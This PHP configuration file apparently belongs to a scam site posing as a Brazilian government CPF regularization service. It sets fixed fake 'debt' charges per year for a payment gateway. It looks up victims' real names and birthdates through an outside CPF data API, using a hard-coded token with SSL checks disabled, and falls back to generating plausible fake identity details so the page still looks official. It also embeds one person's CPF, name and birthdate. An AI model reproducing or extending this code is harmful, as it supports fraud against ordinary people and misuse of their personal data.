<?php
// Configurações Globais do Site de Reconstrução Fiscal

// Valores de débito para cada ano (em centavos)
define('VALOR_2020', 9401);  // R$ 94,01 (Obrigatório)
define('VALOR_2021', 8343);  // R$ 83,43
define('VALOR_2022', 9125);  // R$ 91,25
define('VALOR_2023', 9987);  // R$ 99,87
define('VALOR_2024', 10845); // R$ 108,45
define('VALOR_2025', 12458); // R$ 124,58

// Nome do Produto a ser exibido no gateway
define('PRODUTO_NOME', 'Regularização CPF Gov BR');

// URL e Token da API de consulta de CPF real (se houver). 
// Altere para a URL e Token do seu provedor.
define('API_CONSULTA_URL', 'https://base4.sistemafullativo.online:81/api/cpfx?CPF='); // Exemplo de endpoint
define('API_CONSULTA_TOKEN', '78E092FDEA'); // Insira o token/chave da sua API aqui se necessário

/**
 * Função para obter dados reais ou fictícios com base no CPF (apenas números).
 * Tenta consultar uma API real configurada. Se falhar ou não estiver configurada,
 * utiliza o gerador matemático determinístico baseado no CPF.
 */
function obterDadosCPF($cpf_limpo) {
    // CPF de teste original
    if ($cpf_limpo === '46620588808' || $cpf_limpo === '466.205.888-08') {
        return [
            'nome'       => 'Caique Dos Santos Pires',
            'nascimento' => '09/11/2004'
        ];
    }

    // 1. Tentativa de Consulta via API real se configurada
    if (!empty(API_CONSULTA_TOKEN) || (defined('API_CONSULTA_URL') && API_CONSULTA_URL !== 'https://api.solucaocadastral.com/v1/cpf/')) {
        try {
            $url = API_CONSULTA_URL . $cpf_limpo;
            
            // Adiciona o token na URL caso esteja configurado
            if (!empty(API_CONSULTA_TOKEN)) {
                $url .= (strpos($url, '?') !== false ? '&' : '?') . 'token=' . urlencode(API_CONSULTA_TOKEN);
            }
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 6); // Timeout de 6 segundos
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Evita falhas de SSL em servidores locais/antigos
            
            $headers = ['Content-Type: application/json'];
            // Mantém também o Bearer caso alguma API exija
            if (!empty(API_CONSULTA_TOKEN)) {
                $headers[] = 'Authorization: Bearer ' . API_CONSULTA_TOKEN;
            }
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            
            $response = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            
            if ($http_code === 200 && !empty($response)) {
                $dados_api = json_decode($response, true);
                
                if (is_array($dados_api)) {
                    // Função recursiva simples para buscar chaves 'nome' e 'nascimento' independente da estrutura
                    $nome = '';
                    $nasc = '';
                    
                    // Busca nome nas chaves comuns (independente de maiúscula/minúscula)
                    foreach ($dados_api as $key => $val) {
                        $k = strtolower($key);
                        if ($k === 'nome' || $k === 'nome_completo') {
                            $nome = $val;
                        } elseif ($k === 'nascimento' || $k === 'nasc' || $k === 'data_nascimento' || $k === 'dt_nasc') {
                            $nasc = $val;
                        }
                    }
                    
                    // Se estiver aninhado (ex: dentro de 'data' ou 'result')
                    if (empty($nome)) {
                        $alvos = ['data', 'result', 'registro', 'retorno'];
                        foreach ($alvos as $alvo) {
                            if (isset($dados_api[$alvo]) && is_array($dados_api[$alvo])) {
                                foreach ($dados_api[$alvo] as $key => $val) {
                                    $k = strtolower($key);
                                    if ($k === 'nome' || $k === 'nome_completo') {
                                        $nome = $val;
                                    } elseif ($k === 'nascimento' || $k === 'nasc' || $k === 'data_nascimento') {
                                        $nasc = $val;
                                    }
                                }
                            }
                        }
                    }
                    
                    if (!empty($nome)) {
                        // Trata data se vier no formato YYYY-MM-DD
                        if (preg_match('/^\d{4}-\d{2}-\d{2}$/', $nasc)) {
                            $nasc = date('d/m/Y', strtotime($nasc));
                        }
                        return [
                            'nome'       => mb_convert_case($nome, MB_CASE_TITLE, 'UTF-8'),
                            'nascimento' => $nasc ?: '01/01/1990'
                        ];
                    }
                }
            }
        } catch (Exception $e) {
            // Se falhar a API, segue para o fallback determinístico
        }
    }

    // 2. Fallback: Listas para geração determinística (se não configurada ou se falhar)
    $primeiros_nomes = [
        'José', 'Maria', 'João', 'Ana', 'Antônio', 'Francisco',
        'Carlos', 'Paulo', 'Lucas', 'Luiz', 'Marcos', 'Juliana',
        'Fernanda', 'Patrícia', 'Camila', 'Aline', 'Sandra',
        'Roberto', 'Anderson', 'Bruno'
    ];
    $sobrenomes = [
        'Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira',
        'Alves', 'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro',
        'Martins', 'Carvalho', 'Almeida', 'Lopes', 'Soares', 'Dias',
        'Vieira', 'Rocha'
    ];

    $n = count($primeiros_nomes);
    $s = count($sobrenomes);

    // Gera hashes independentes para cada campo usando o CPF completo como chave
    $h1 = abs(crc32($cpf_limpo . 'nome1'));
    $h2 = abs(crc32($cpf_limpo . 'sobrenome1'));
    $h3 = abs(crc32($cpf_limpo . 'sobrenome2'));
    $hd = abs(crc32($cpf_limpo . 'dia'));
    $hm = abs(crc32($cpf_limpo . 'mes'));
    $ha = abs(crc32($cpf_limpo . 'ano'));

    $nome1 = $primeiros_nomes[$h1 % $n];
    $nome2 = $sobrenomes[$h2 % $s];
    $nome3 = $sobrenomes[$h3 % $s];

    $dia = str_pad(($hd % 28) + 1, 2, '0', STR_PAD_LEFT);
    $mes = str_pad(($hm % 12) + 1, 2, '0', STR_PAD_LEFT);
    $ano = 1965 + ($ha % 41); // 1965–2005

    return [
        'nome'       => "$nome1 $nome2 $nome3",
        'nascimento' => "$dia/$mes/$ano"
    ];
}
